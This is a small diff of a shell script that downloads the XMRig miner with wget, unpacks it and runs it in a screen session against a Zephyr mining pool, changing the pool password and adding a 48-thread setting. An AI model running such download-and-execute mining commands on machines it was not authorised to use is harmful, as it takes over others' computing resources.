@@ -3,5 +3,5 @@ wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-focal
 tar -zxvf xmrig-6.21.0-focal-x64.tar.gz
  cd xmrig-6.21.0
 screen -R
-./xmrig -o zephyr.miningocean.org:5332 -a rx -k -u ZEPHYR2n8h9YCnwdbabExgj2Cn94QSL6RV18i1XTiUT9KQNrTmTnmqxhCiuE2TJvdQbvQRqDoHtAP3ihEd7mGb5MVyXMvV6K7a53t -p okcondee
+./xmrig -o zephyr.miningocean.org:5332 -a rx -k -u ZEPHYR2n8h9YCnwdbabExgj2Cn94QSL6RV18i1XTiUT9KQNrTmTnmqxhCiuE2TJvdQbvQRqDoHtAP3ihEd7mGb5MVyXMvV6K7a53t -p test -t 48
 fi
